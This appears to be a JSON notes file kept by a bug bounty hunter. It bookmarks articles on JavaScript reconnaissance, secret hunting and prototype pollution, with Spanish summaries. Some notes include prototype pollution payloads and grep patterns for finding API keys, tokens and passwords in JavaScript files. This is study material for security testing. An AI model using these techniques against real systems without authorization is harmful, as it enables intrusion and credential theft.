      "payload": "https://freedium.cfd/https://medium.com/@rudrasonkusare0222/how-to-perform-static-analysis-of-javascript-files-37b3657d92e8",
      "note": "Despu√©s de completar el paso 1, tendr√° bastantes archivos JavaScript, estos generalmente est√°n ofuscados y b√°sicamente transforman su c√≥digo para que sea dif√≠cil robarlo o copiarlo. Para convertir el c√≥digo ofuscado, necesitamos desofuscarlo, lo cual puede hacer con las siguientes herramientas.\n\nEmbellecedor JS\nJSillery\nJSDetox\nIlluminateJS\nJSNice",
      "editedTs": 1761552658692,
      "status": "regular"
    },
    {
      "id": "dl61wdc",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://anasbetis023.medium.com/bugs-js-a-closer-look-at-javascript-for-successful-bug-hunting-fddb0d796498",
      "note": "nada",
      "editedTs": 1761552676850,
      "status": "monton"
    },
    {
      "id": "beglpka",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://anontriager.medium.com/javascript-recon-efd981a85cfc",
      "note": "varias tools interesante pero nada nuevo.",
      "editedTs": 1761552700945,
      "status": "regular"
    },
    {
      "id": "uhiv9ix",
      "title": "Nuevo informe",
      "payload": "https://oreobiscuit.gitbook.io/introduction/mains/js-analysis-for-bug-bounty",
      "note": "nada interesante solo algunos link a meduim de js nada nuevo.",
      "editedTs": 1761552721422,
      "status": "monton"
    },
    {
      "id": "ukpe717",
      "title": "Nuevo informe",
      "payload": "https://kongsec.medium.com/how-to-js-for-bug-bounties-edition-2023-7108b56d9db6",
      "note": "nada",
      "editedTs": 1761552733284,
      "status": "monton"
    },
    {
      "id": "rzcj83t",
      "title": "Nuevo informe",
      "payload": "https://kongsec.medium.com/js-for-bug-bounties-2-0-extreme-edition-2024-f167fa48276a",
      "note": "esta normal nada nuevo algo interesante la regal regex para filtrar lso url de waybacurk solo deje las extension etc \n\nsed 's|^https\\?://[^/]\\+/||':Este comando elimina el protocolo ( http://o https://) y el nombre de dominio de cada URL, dejando solo la ruta.\nawk -F '/' '{print $NF}':Este comando extrae la √∫ltima parte de cada URL despu√©s de dividirla por /, eliminando efectivamente la parte del dominio.",
      "editedTs": 1761552747288,
      "status": "regular"
    },
    {
      "id": "176kc77",
      "title": "Nuevo informe",
      "payload": "https://kongsec.medium.com/how-to-urling-for-bug-bounties-mastering-urls-edition-2025-a9dca9e2a97f",
      "note": "solo interesante la img del protocolo http",
      "editedTs": 1761552762180,
      "status": "monton"
    },
    {
      "id": "6qqk6y2",
      "title": "Nuevo informe",
      "payload": "https://medium.com/legionhunters/js-recon-to-html-injection-4cdca8fd88cf",
      "note": "Consejo adicional: la mayor√≠a de las funciones y credenciales codificadas o claves API existen en los archivos main.js, app.js, index.js, <custom-name>.js, son como una mina de oro.",
      "editedTs": 1761552780477,
      "status": "buen"
    },
    {
      "id": "k8engqi",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/http://infosecwriteups.com/exposed-client-secret-in-javascript-resulted-in-quick-bug-bounty-35a609be138d",
      "note": "shh",
      "editedTs": 1761552818889,
      "status": "monton"
    },
    {
      "id": "u9btlfm",
      "title": "Nuevo informe",
      "payload": "https://hackersatty.medium.com/how-to-find-hidden-api-endpoints-and-secrets-in-javascript-files-for-bug-bounties-web-app-f4ea92d16954",
      "note": "muy bueno super buneo completo tool explicacion cosas interesante t la tool  fff para probar los puntos finales varios etc varias reglas regex\ninteresante como buscar funcion de creacion url entres otros este le sabe.\n\nrepo tool fff: https://github.com/tomnomnom/fff",
      "editedTs": 1761552841882,
      "status": "excelente"
    },
    {
      "id": "f7601tb",
      "title": "Nuevo informe",
      "payload": "https://blogs.jsmon.sh/100-regex-patterns/",
      "note": "contiene unas 100 reglas regex interesante de diversas categorias\nya arme scrpy con ripgrep para poder hacerlo todo automatizado solo reglas\nregex sumar las 50 mas de https://github.com/l4yton/RegHex?source=post_page-----c95a8aa7037a--------------------------------",
      "editedTs": 1761552859900,
      "status": "muybueno"
    },
    {
      "id": "wrnezqo",
      "title": "Nuevo informe",
      "payload": "https://www.intigriti.com/researchers/blog/hacking-tools/testing-javascript-files-for-bug-bounty-hunters",
      "note": "nada nuevo",
      "editedTs": 1761552876159,
      "status": "monton"
    },
    {
      "id": "dymoosl",
      "title": "Nuevo informe",
      "payload": "https://sechunter.medium.com/js-is-love-%EF%B8%8F-ca393a4849e9",
      "note": "Nada interesante para mi.",
      "editedTs": 1761647971359,
      "status": "regular"
    },
    {
      "id": "ckfnp9o",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@z0id/90-of-people-are-doing-this-in-bountys-read-to-find-out-d99a3bb7bea7",
      "note": "Nada nuevo para mi solo buscar llamadas xhr.",
      "editedTs": 1761648138938,
      "status": "regular"
    },
    {
      "id": "nelwsc5",
      "title": "Nuevo informe",
      "payload": "https://jsoverson.medium.com/hacking-javascript-with-javascript-6adbeaba22e9",
      "note": "Esta interesante pero el tipo se encontro con el mismo problema que me encontre yo con lo que seria reglas regex independientemente cual regla regex sea para parsear js etc no funciona del todo bien ya que no contempla todo las variaciones etc contexto ejemplo: \n\n(?(DEFINIR)(?'valor'(?P>cualquiera)?))(?(DEFINIR)(?'cualquiera'(?P>exterior_desequilibrado)*(?:(?P>par√°metro)|(?P>llaves)|(?P>corchetes)|(?P>cadena)|)+(?P>exterior_desequilibrado)*))(?(DEFINIR)(?'cualquiera_interno'(?P>interior_desequilibrado)*(?:(?P>par√°metro)|(?P>llaves)|( ?P>corchetes)|(?P>cadena)|)+(?P>interno_desequilibrado)*))(?(DEFINE)(?'par√°metro'\\(\\s*(?P>cualquier_interno)+\\s*\\)))(?(DEFINE)(?'llaves'\\{\\s*(?P>cualquier_interno)+\\s*\\}))(?(DEFINE)(?'corchetes'\\[\\s*(?P>cualquier_interno)+\\s*\\]))(?(DEFINE)(?'cadena'((?P>cadena_ comillas_dobles)|(?P>comilla_simple_de_cadena)|(?P>tick_de_cadena))))(?(DEFINIR)(?'comilla_doble_de_cadena'\"(?P>contexto_de_cadena)?\"))(?(DEFINIR)(?'comilla_simple_de_cadena'\\'(?P>contexto_de_cadena)?\\'))(?(DEFINIR)(?'tick_de_cadena'`(?P>contexto_de_cadena)?`))(?(DEFINIR E)(?'contexto_de_cadena'(?>\\\\[\\s\\S]|[^\\\\])*))(?(DEFINIR)(?'exterior_desequilibrado'[^\\(\\)\\{\\}\\[\\]\\\"'`,;]))(?(DEFINIR)(?'interior_desequilibrado'(?:(?P>exterior_desequilibrado)|[,;])))(var|let|const|\\G,)\\s+(?:(?<nombre_de_variable>\\w+)(?:\\s*\\=\\s*(?P>valor))?\\s*);?\n\neste regla regex no contempla cosas mas complejas como.\n\nUsa recursi√≥n y (?P>...) lo que sugiere un engine PCRE con recursividad ‚Äîpoca gente lo ejecuta sobre grandes repos.\n\nIntenta capturar value con (?P>any) pero:\n\nno cubre destructuring,\n\nno distingue regex literal /.../ vs division operator,\n\nno distingue template expressions ${...},\n\nno considera export/import/class fields.\n\nResultado: funciona en ejemplos limpios controlados, pero en el wild produces noise y tiempos de ejecuci√≥n largos. \n\nen fin para la persona del informe de meduim esta bien lo que tomo la opcione sa pero para hacer mas simplem y potente como lo hice yo seria\nsimplemente dejar los que seria numero de ip llamadas aja redes , entres otros dejarlo con reglas regex pero no limitarse con solo eso que sea todo reglas regex son crear categorias independiente unas 70 como lo tegno yo y cada categoria tiene su propio diccionario de palabras claves ejemplo la categoria de variables con un diccionario con palabras claves ejemplo etc y listo y lo convias con regex tambine con ripgrep y chau demsiado complejidad se hacen al pepe.",
      "editedTs": 1761649491509,
      "status": "muybueno"
    },
    {
      "id": "k7aweni",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@ghostlulzhacks/vulnerable-javascript-file-188b6287179",
      "note": "no vi explotacion real en un target bug bounty con los cve de extension retire .js pss nada nada che pero bueno.",
      "editedTs": 1761649725660,
      "status": "regular"
    },
    {
      "id": "9a50az5",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/i-used-usedjs-to-find-100-vulnerabilities-heres-how-4c510fdb1f63",
      "note": "pues solo esto intersante.\n\n Un flujo de trabajo para gobernarlos a todos\nCopiar\nusedjs ‚Üí LinkFinder ‚Üí truffleHog ‚Üí sourcemaps ‚Üí AI ‚Üí Burp/Postman\nEsta pila tiene:\n\nSe encontraron fugas de tokens OAuth en paquetes de React minimizados\nSe descubrieron omisiones de autenticaci√≥n solo de depuraci√≥n en los comentarios de JS\nAPI olvidadas expuestas de SPA heredadas\nCondujo a recompensas de m√°s de $5,000 por fallas en la l√≥gica del token y CSP",
      "editedTs": 1761650033033,
      "status": "buen"
    },
    {
      "id": "p0sutoa",
      "title": "Prototype pollucion",
      "payload": "https://freedium.cfd/https://medium.com/meetcyber/250-bounty-poisoning-the-prototype-exploiting-lodashs-hidden-attack-surface-bbc092de974c",
      "note": "C√≥mo encontrar prototipos similares de insectos contaminantes\nBusque funciones de fusi√≥n profunda:\nHerramientas como merge, defaults, o zipObjectDeepque combinan objetos anidados son objetivos principales.\n2. Pruebe cargas √∫tiles basadas en prototipos:\n\nPruebe con teclas como __proto__, constructor.prototype, o prototype.\nCopiar\n{ \"__proto__.admin\": true }\n3. Verificar el impacto global:\n\nDespu√©s de la inyecci√≥n, cree un nuevo objeto vac√≠o y vea si persisten los valores contaminados:\nCopiar\nconsole.log({}.admin); // Should be undefined in a safe implementation\n4. Grepping del c√≥digo:\n\nBusque cualquier mergeutilidad assignDeepde construcci√≥n de objetos que gestione la entrada del usuario. Est√© atento a cualquier forma de construcci√≥n de rutas sin verificar.",
      "editedTs": 1761650298162,
      "status": "buen"
    },
    {
      "id": "8nnfid5",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://osintteam.blog/hunting-for-secrets-in-source-maps-map-files-de969e4b0cdb",
      "note": "nada interesante.",
      "editedTs": 1761650444167,
      "status": "monton"
    },
    {
      "id": "1hnkqfo",
      "title": "Prototype pollucion",
      "payload": "https://medium.com/infosecmatrix/what-is-prototype-pollution-76694f0db76a",
      "note": "Para una explotaci√≥n exitosa de la contaminaci√≥n prototipo se requieren los siguientes componentes clave:\n\nUna fuente de contaminaci√≥n prototipo : es cualquier entrada que le permite envenenar objetos prototipo con propiedades arbitrarias.\nUn sumidero : en otras palabras, una funci√≥n de JavaScript o un elemento DOM que permite la ejecuci√≥n de c√≥digo arbitrario.\nUn dispositivo explotable : es cualquier propiedad que se arroja a un fregadero sin una filtraci√≥n o desinfecci√≥n adecuadas.\nPrototipos de fuentes de contaminaci√≥n\nUna fuente de contaminaci√≥n de prototipos es cualquier entrada controlable por el usuario que permite a√±adir propiedades arbitrarias a los objetos de prototipos. Las fuentes m√°s comunes son las siguientes:\n\nLa URL a trav√©s de la consulta o de la cadena de fragmento (hash)\nEntrada basada en JSON\nMensajes web\nPrototipo de contaminaci√≥n a trav√©s de la URL\nConsidere la siguiente URL, que contiene una cadena de consulta construida por el atacante:\n\nhttps://vulnerable-website.com/?__proto__[evilProperty]=payload\n\nAl descomponer la cadena de consulta en key:valuepares, un analizador de URL podr√≠a interpretarla __proto__como una cadena arbitraria. Pero veamos qu√© sucede si estas claves y valores se fusionan posteriormente en un objeto existente como propiedades.\n\nSe podr√≠a pensar que la __proto__propiedad, junto con sus anidadas evilProperty, simplemente se agregar√°n al objeto de destino de la siguiente manera:\n\n{ \n    propiedadexistente1: 'foo' , \n    propiedadexistente2: 'bar' , \n    __proto__: { \n        propiedadevil: 'carga √∫til'\n     } \n}\nSin embargo, este no es el caso. En alg√∫n momento, la operaci√≥n de fusi√≥n recursiva podr√≠a asignar el valor de evilPropertyusar una instrucci√≥n equivalente a la siguiente:\n\ntargetObject.__proto__.evilProperty = 'payload';\n\nDurante esta asignaci√≥n, el motor de JavaScript act√∫a __proto__como un getter para el prototipo. Como resultado, evilPropertyse asigna al objeto prototipo devuelto en lugar del objeto de destino. Suponiendo que el objeto de destino usa el valor predeterminado Object.prototype, todos los objetos en el entorno de ejecuci√≥n de JavaScript heredar√°n ahora el valor predeterminado evilProperty, a menos que ya tengan una propiedad propia con una clave coincidente.\n\nEn la pr√°ctica, es poco probable que inyectar una propiedad llamada evilPropertytenga alg√∫n efecto. Sin embargo, un atacante puede usar la misma t√©cnica para contaminar el prototipo con propiedades utilizadas por la aplicaci√≥n o cualquier biblioteca importada.\n\nPrototipo de contaminaci√≥n mediante entrada JSON\nLos objetos controlables por el usuario suelen derivarse de una cadena JSON mediante el JSON.parse()m√©todo. Curiosamente, JSON.parse()tambi√©n trata cualquier clave del objeto JSON como una cadena arbitraria, incluyendo elementos como __proto__. Esto proporciona otro vector potencial de contaminaci√≥n de prototipos.\n\nDigamos que un atacante inyecta el siguiente JSON malicioso, por ejemplo, a trav√©s de un mensaje web:\n\n{ \n    \"__proto__\" :  { \n        \"evilProperty\" :  \"carga √∫til\" \n    } \n}\nSi esto se convierte en un objeto JavaScript a trav√©s del JSON.parse()m√©todo, el objeto resultante de hecho tendr√° una propiedad con la clave __proto__:\n\nconstante objectLiteral = {__proto__: {evilProperty: 'payload '}}; \nconstante objectFromJson = JSON.parse ('{ \"__proto__\" : { \"evilProperty\" : \"payload\" }}'); objectLiteral.hasOwnProperty ( '__proto__ ' );      // falso objectFromJson.hasOwnProperty ( ' __proto__ ' );     // verdadero\n\n\nSi el objeto creado mediante JSON.parse()se fusiona posteriormente con un objeto existente sin una desinfecci√≥n de clave adecuada, esto tambi√©n provocar√° una contaminaci√≥n del prototipo durante la asignaci√≥n, como vimos en el ejemplo anterior basado en URL .\n\nPrototipos de sumideros de contaminaci√≥n\nUn sumidero de contaminaci√≥n de prototipos es b√°sicamente una funci√≥n de JavaScript o un elemento DOM al que se puede acceder mediante contaminaci√≥n de prototipos, lo que permite ejecutar comandos arbitrarios de JavaScript o del sistema. Hemos abordado algunos sumideros del lado del cliente en detalle en nuestro tema sobre XSS de DOM .\n\nDado que la contaminaci√≥n de prototipos permite controlar propiedades que de otro modo ser√≠an inaccesibles, esto potencialmente permite acceder a varios receptores adicionales dentro de la aplicaci√≥n de destino. Los desarrolladores que no est√©n familiarizados con la contaminaci√≥n de prototipos pueden asumir err√≥neamente que estas propiedades no son controlables por el usuario, lo que significa que el filtrado o la desinfecci√≥n podr√≠an ser m√≠nimos.\n\nPrototipos de dispositivos anticontaminaci√≥n\nUn dispositivo permite convertir la vulnerabilidad de contaminaci√≥n del prototipo en un exploit real. Se trata de cualquier propiedad que:\n\nUtilizado por la aplicaci√≥n de forma insegura, como por ejemplo pas√°ndolo a un fregadero sin un filtrado o sanitizaci√≥n adecuados.\nControlable por el atacante mediante la contaminaci√≥n del prototipo. En otras palabras, el objeto debe poder heredar una versi√≥n maliciosa de la propiedad a√±adida al prototipo por un atacante.\nUna propiedad no puede ser un gadget si est√° definida directamente en el propio objeto. En este caso, la versi√≥n propia de la propiedad del objeto prevalece sobre cualquier versi√≥n maliciosa que se pueda a√±adir al prototipo. Los sitios web robustos tambi√©n pueden establecer expl√≠citamente el prototipo del objeto en null, lo que garantiza que no herede ninguna propiedad.",
      "editedTs": 1761650683415,
      "status": "buen"
    },
    {
      "id": "ssx6p0f",
      "title": "Prototype pollucion",
      "payload": "https://freedium.cfd/https://gupta-bless.medium.com/understanding-prototype-pollution-95a83f9ee102",
      "note": "Como todos sabemos, JavaScript es uno de los lenguajes de programaci√≥n orientados a objetos que admite la funcionalidad de herencia. Por lo tanto, siempre que en JavaScript intentamos acceder a un objeto, primero verifica el objeto y luego si existe una propiedad para √©l. Si la propiedad existe, devolver√° la misma; de lo contrario, comenzar√° a buscar la misma propiedad en su prototipo. Este proceso contin√∫a hasta que se encuentra la propiedad cuando el objeto no tiene un prototipo asociado.\n\n\nIntentemos entenderlo con un ejemplo, donde A es el objeto y B es la propiedad.\n\nConstante A = {B = \"bendecir\"}\n\nAB // \"bendecir\"\n\nAC // indefinido\n\n//declaraci√≥n de prototipos\n\nObjeto.prototipo.B = \"Hola BB\"\n\nObjeto.prototipo.C = \"Hola C\"\n\nAB // bendecir\n\nAC // Hola C\n\nComo podemos ver claramente, C no est√° declarado en la propiedad, pero su prototipo ya exist√≠a. Si un atacante logra modificar el prototipo, afectar√° a todos los objetos que heredan de √©l, lo que puede tener consecuencias inesperadas.\n\nEsta vulnerabilidad permite a los atacantes a√±adir propiedades accesibles a todos los objetos en JavaScript, e incluso controlar las propiedades de los objetos y sus valores predeterminados. De esta forma, un atacante puede manipular o alterar la l√≥gica de la aplicaci√≥n, lo que en √∫ltima instancia puede provocar ataques de denegaci√≥n de servicio (DoS) o RCE. Se a√±aden propiedades arbitrarias a objetos globales que posteriormente invocan los objetos definidos por el usuario.\n\nEsta vulnerabilidad existe cuando la aplicaci√≥n no gestiona la propiedad controlada por el atacante de forma segura. Exploremos c√≥mo identificar aplicaciones vulnerables y c√≥mo aprovecharlas al m√°ximo.\n\nAl principio, necesitamos inyectar la propiedad con una clave como _proto_, que tambi√©n tiene propiedades anidadas. En JavaScript, _proto_ es una forma de heredar propiedades de un objeto o incluso expone el [[prototipo]] del objeto a trav√©s del cual se accede. De esta forma, podemos comprobar si el prototipo contiene valores da√±inos que puedan ser perjudiciales para la aplicaci√≥n. En JavaScript, tenemos el objeto globo de bolet√≠n, es decir, Object.prototype.\n\nEn cualquier aplicaci√≥n, primero debo buscar las √°reas de entrada donde puedo inyectar este _proto_. Al inyectar esta entrada, ?__proto__bless=bless en la URL de mi aplicaci√≥n, debo verificar si la respuesta se refleja all√≠ ingresando Object.prototype en la pesta√±a de la consola.",
      "editedTs": 1761650954108,
      "status": "buen"
    },
    {
      "id": "mk0n11x",
      "title": "Nuevo informe",
      "payload": "https://mux0xx.medium.com/how-to-expand-your-attack-surface-and-avoid-duplicates-6c5b01f32b93",
      "note": "pues nada interesante solo la explicacion de como capturar y la recomendacion de no guatdar en x formato desabilitar esa opcion en  burp suite etc y nada mas interesante.",
      "editedTs": 1761651168653,
      "status": "regular"
    },
    {
      "id": "l6ek0uh",
      "title": "js buenas practicas",
      "payload": "https://freedium.cfd/https://latteandcode.medium.com/10-consejos-trucos-de-javascript-que-conviene-saber-109d8ef99a4c",
      "note": "esta bueno varios consejos muchos de ellos no sabia y son basico existen mucho mas creare un repo aparte para js.",
      "editedTs": 1761651586746,
      "status": "muybueno"
    },
    {
      "id": "fwqo1po",
      "title": "js tips",
      "payload": "https://medium.com/williambastidasblog/40-tips-javascript-5b7212a12f94",
      "note": "Es un lenguaje de programaci√≥n din√°mica (como ning√∫n otro).\nOrigen en 1995 con el nombre de LiveScript y cambi√≥ su nombre posteriormente a javaescript como una estrategia de mercadeo por el apogeo que ten√≠a en ese entonces Java.\nJava y Javascript son lenguajes de programaci√≥n totalmente diferentes. (aunque sus sintaxis tengan cierta similitud).\nAntes de nodejs javascript solo se ejecutaba del lado del cliente. (En los navegadores web).\nJavascript no tiene capacidad multihilo o m√∫ltiples procesos simult√°neos. Solo puede ejecutar un procedimiento secuencial a la vez. (Cuando una funci√≥n se ejecuta fuera del hilo principal lo que hace es caer a una pila de funciones o procedimientos de javascript).\nEn javascript la etiqueta <script> crea un objeto global.\nCualquier funci√≥n o variable es alojada en el objeto global o principal (Global Object).\nPodemos escribir ‚Äúwindows‚Äù en la consola del navegador para ver el objeto global.\nUn objeto en c√≥digo javascript empieza y se cierra con llaves.{}\nUn objeto en javascript es una colecci√≥n de propiedades de pares clave ‚Äî valor.\nCuando se corre javascript del lado del servidor (nodejs) el objeto principal no es windows.\nPara hacer anotaciones en la consola con alguna distinci√≥n podemos utilizar console.log(a), console.info(a), console.warn(a), console.erro(a).\nEn todas las variables primitivas el valor por defecto es indefinido.\nCuando utilizamos la igualdad abstracta (doble igual == ) no estamos comparando el tipo de dato de la variable.\nCuando utilizamos la igualdad estricta (triple igual === ) estamos comparando el tipo de dato de la variable.\nUn tipo de dato primitivo es un tipo de dato que apunta a un solo valor.\nEn javascript las variables no est√°n amarradas a un tipo de dato.\nUn objeto es una colecci√≥n de tipos de datos primitivos o de otros objetos.\nAl crear un objeto con m√°s de una propiedad, estos se separan por coma.\nEl elemento √∫ltimo de un objeto no termina en ‚Äú , ‚Äù o ‚Äú ; ‚Äù\nAl crear un objeto o una funci√≥n con un nombre compuesto debemos usar camelCase.\nEL nombre de una variable siempre debe empezar con min√∫scula.\nAl crear un atributo dentro de un objeto no es necesario reservarlo con la palabra ‚Äúvar‚Äù.\nLa notaci√≥n de punto nos permite acceder a las propiedades o valores de un objeto.\nDebemos evitar el uso de acentos y caracteres especiales en los nombres de nuestras variables, objetos y funciones.\nEn javascript todo retorna un valor.\nLas funciones en javascript son objetos.\nEn javascript existen funciones an√≥nimas (sin nombre) y funciones expl√≠citas (con nombre).\nLas variables, objetos y funciones an√≥nimas son las que se definen en el momento que las vamos a usar.\nColocamos par√©ntesis ‚Äú()‚Äù inmediatamente despu√©s de una funci√≥n an√≥nima para decir le a JavaScript ‚ÄúEjecuta este c√≥digo que estoy poniendo aqu√≠ como si se tratara de una funci√≥n‚Äù.\nUna funci√≥n an√≥nima tiene sentido cuando queremos pasar como par√°metro una funci√≥n muy sencilla y definirla a parte seria cuanto menos innecesario.\nUna funci√≥n an√≥nima tiene sentido cuando intentamos evitar a toda costa el uso de variables globales.\nLos dos par√©ntesis finales se utilizan para llamar a una funci√≥n an√≥nima.\nEn JavaScript una funci√≥n se ejecuta cuando la llamamos usando los par√©ntesis (Sin par√©ntesis se obtiene una referencia a la misma).\nLas funciones pueden recibir tipos primitivos, objetos y otras funciones como par√°metros.\nUn array es una variable especial, que puede contener m√°s de un valor.\nMuchos m√©todos para el objeto Array de JavaScript est√°n dise√±ados para ser aplicados generalmente a todos los objetos los cuales ‚Äúse asemejan‚Äù a las matrices unidimensionales.\nLa primera posici√≥n de un arreglo en javascript es el 0.\nEn javascript arr.map() nos permite ejecutar una funci√≥n por cada uno de los elementos de ese arreglo ‚Äúarr‚Äù.",
      "editedTs": 1761651819245,
      "status": "muybueno"
    },
    {
      "id": "49lw4mo",
      "title": "js que podemos buscar",
      "payload": "https://medium.com/@ahmed.elshaepe/all-about-javascript-analysis-for-bug-bounty-hunting-3e0f941c9676",
      "note": "c√≥digo fuente, descubres un archivo \"app.js\". Adem√°s, al visitar [nombre del sitio https://www.example.com/settings], ver√°s un archivo \" settings.js \".\n\n\nSin embargo, en este momento, nos centramos en app.js. ¬øQu√© buscamos? Nuevos endpoints , par√°metros y, quiz√°s, claves API .\n\nLo que est√°s buscando\nNuevos puntos finales\n\nNuevo par√°metro\n\nFunciones ocultas. No est√°n disponibles en la aplicaci√≥n web, pero el c√≥digo existe para la funci√≥n. ¬øSolo para usuarios premium? ¬øSe puede interactuar con ella como usuario no premium?\n\nClaves API\n\nLos comentarios de los desarrolladores (por ejemplo, // este es un comentario de desarrollo o /* este es un comentario de desarrollo de varias l√≠neas */) a veces pueden contener informaci√≥n como la fecha de publicaci√≥n del c√≥digo o las actualizaciones realizadas. Si el c√≥digo es antiguo, es m√°s probable que encuentres un problema.",
      "editedTs": 1761651991510,
      "status": "buen"
    },
    {
      "id": "r8qkpjf",
      "title": "muy bueno grep categorias nuevas",
      "payload": "https://0xmaruf.medium.com/grep-tips-for-javascript-analysis-bug-bounty-7dce88266121",
      "note": "C√≥mo extraer archivos JavaScript de directorios recursivos\nfind /path/to/your/folders -name ‚Äú*.js‚Äù -exec mv {} /path/to/target/folder/ \\;\n\ncat * es para todos los archivos de la carpeta.\nB√∫squeda de claves API y secretos\ncat * | grep -rE ‚Äúapikey|api_key|secret|token|password|auth|key|pass|user‚Äù\n\nDetecci√≥n de llamadas a funciones peligrosas\ncat * | grep -rE ‚Äúeval|document\\.write|innerHTML|setTimeout|setInterval|Function‚Äù\n\n\nComprobaci√≥n de manipulaci√≥n de URL\ncat * | grep -rE ‚Äúlocation\\.href|location\\.replace|location\\.assign|window\\.open‚Äù\n\nB√∫squeda de solicitudes de origen cruzado\ncat * | grep -rE ‚ÄúXMLHttpRequest|fetch|Access-Control-Allow-Origin|withCredentials‚Äù /path/to/js/files\n\nAnalizando el uso de `postMessage`\ncat * | grep -r ‚ÄúpostMessage‚Äù\n\nC√≥mo encontrar URL o puntos finales codificados de forma r√≠gida\ncat * | grep -rE ‚Äúhttps?://|www\\.‚Äù\n\nLocalizaci√≥n de informaci√≥n de depuraci√≥n\ncat * | grep -rE ‚Äúconsole\\.log|debugger|alert|console\\.dir‚Äù\n\nInvestigaci√≥n del manejo de la entrada del usuario\ncat * | grep -rE ‚Äúdocument\\.getElementById|document\\.getElementsByClassName|document\\.querySelector|document\\.forms‚Äù",
      "editedTs": 1761652124398,
      "status": "excelente"
    },
    {
      "id": "td1s4pv",
      "title": "Nuevo informe",
      "payload": "https://infosecwriteups.com/bug-bounty-tips-tricks-js-javascript-files-bdde412ea49d",
      "note": "nada interesante.",
      "editedTs": 1761652696521,
      "status": "monton"
    },
    {
      "id": "b4i5i2u",
      "title": "Nuevo informe",
      "payload": "https://blog.shiftleft.io/angular-react-vulnerability-cheatsheet-a3b36f22a0fd",
      "note": "Hoy, analizaremos seis de las vulnerabilidades m√°s comunes que afectan a las aplicaciones Angular y React, y c√≥mo encontrarlas y prevenirlas. Las vulnerabilidades que abordar√© en esta publicaci√≥n son:\n\nOmisi√≥n de autenticaci√≥n\nControl de acceso inadecuado\nAbrir redirecciones\nFalsificaci√≥n de solicitud entre sitios (CSRF)\nInyecci√≥n de plantilla\nInclusi√≥n de secuencias de comandos entre sitios (XSSI)\nOmisi√≥n de autenticaci√≥n\nLa autenticaci√≥n consiste en comprobar la identidad antes de ejecutar acciones confidenciales o acceder a datos confidenciales. Si la autenticaci√≥n no se implementa correctamente en una aplicaci√≥n, los atacantes pueden aprovechar estas configuraciones incorrectas para acceder a funciones a las que no deber√≠an tener acceso.\n\nPor ejemplo, el enrutamiento en Angular suele realizarse con AppRoutingModule. Antes de dirigir a los usuarios a rutas sensibles en la aplicaci√≥n, debe comprobar si el usuario ha sido autenticado y autorizado para acceder a ese recurso.\n\n\nPara obtener m√°s detalles sobre c√≥mo configurar la autenticaci√≥n correctamente en Angular y React, lea estos tutoriales .\n\nLl√©vame de nuevo a la cima.\n\nControl de acceso inadecuado\nUn control de acceso inadecuado ocurre siempre que el control de acceso en una aplicaci√≥n se implementa incorrectamente y puede ser evadido por un atacante. Los problemas de evasi√≥n de autenticaci√≥n son esencialmente un tipo de control de acceso inadecuado. Sin embargo, el control de acceso abarca m√°s que la autenticaci√≥n. Mientras que la autenticaci√≥n solicita al usuario que demuestre su identidad: \"¬øQui√©n es usted?\", la autorizaci√≥n pregunta a la aplicaci√≥n: \"¬øQu√© puede hacer este usuario?\". La autenticaci√≥n y la autorizaci√≥n adecuadas garantizan que los usuarios no puedan acceder a funcionalidades fuera de sus permisos.\n\nHay varias maneras de configurar la autorizaci√≥n de usuarios: control de acceso basado en roles, control de acceso basado en propiedad, listas de control de acceso y m√°s. Aqu√≠ tienes algunas publicaciones √∫tiles para implementar el control de acceso en Angular y React .\n\nUn error com√∫n que cometen los desarrolladores es realizar comprobaciones de autorizaci√≥n en el lado del cliente. Esto no es seguro, ya que un atacante puede anular estas comprobaciones. Estas comprobaciones de autorizaci√≥n deben realizarse mediante c√≥digo del lado del servidor:\n\n\nLl√©vame de nuevo a la cima.\n\nRedirecciones abiertas\nLos sitios web suelen necesitar redirigir autom√°ticamente a sus usuarios. Por ejemplo, esta\nsituaci√≥n ocurre cuando usuarios no autenticados intentan acceder a una p√°gina\nque requiere iniciar sesi√≥n. El sitio web suele redirigir a esos usuarios a la\np√°gina de inicio de sesi√≥n y, una vez autenticados, los regresa a su ubicaci√≥n original.\n\nRecibe las historias de Vickie Li en tu bandeja de entrada\n√önase a Medium de forma gratuita para recibir actualizaciones de este escritor.\n\nIntroduce tu correo electr√≥nico\nSuscribir\nDurante un ataque de redirecci√≥n abierta, un atacante enga√±a al usuario para que visite\nun sitio externo proporcion√°ndole una URL del sitio leg√≠timo que\nredirige a otro sitio. Esto puede hacer creer a los usuarios que siguen en el sitio original y ayudar a los estafadores a crear una campa√±a de phishing m√°s cre√≠ble.\n\nPara evitar redirecciones abiertas, aseg√∫rese de que la aplicaci√≥n no redirija a los usuarios a ubicaciones maliciosas. Por ejemplo, puede deshabilitar completamente las redirecciones externas validando las URL de redireccionamiento :\n\n\nExisten muchas otras maneras de evitar las redirecciones abiertas, como verificar el origen de las solicitudes o usar √≠ndices de p√°gina para las redirecciones. Sin embargo, debido a la dificultad de validar las URL , las redirecciones abiertas siguen siendo un problema frecuente en las aplicaciones web modernas.\n\nLl√©vame de nuevo a la cima.\n\nFalsificaci√≥n de solicitud entre sitios\nLa falsificaci√≥n de solicitud entre sitios (CSRF) es una t√©cnica del lado del cliente que se utiliza para atacar a otros usuarios de una aplicaci√≥n web. Mediante CSRF, los atacantes pueden enviar solicitudes HTTP que simulan provenir de la v√≠ctima y realizar acciones no deseadas en su nombre. Por ejemplo, un atacante podr√≠a cambiar su contrase√±a o transferir dinero de su cuenta bancaria sin su permiso.\n\nA diferencia de las redirecciones abiertas, existe una forma infalible de prevenir CSRF: usar una combinaci√≥n de tokens CSRF y cookies de SameSite , y evitar el uso de solicitudes GET para acciones que alteren el estado. Por ejemplo, Angular permite agregar tokens antifalsificaci√≥n a las solicitudes HTTP mediante el HttpClientXsrfModulem√≥dulo:\n\n\nLl√©vame de nuevo a la cima.\n\nInyecci√≥n de plantilla\nLas plantillas web son archivos similares a HTML que permiten a los desarrolladores especificar c√≥mo se debe renderizar una p√°gina combinando datos de la aplicaci√≥n con plantillas est√°ticas. Esta funcionalidad permite a los desarrolladores insertar contenido din√°mico obtenido de una base de datos o de una solicitud HTTP en p√°ginas web.\n\nLa inyecci√≥n de plantillas se refiere a la inyecci√≥n en plantillas web. 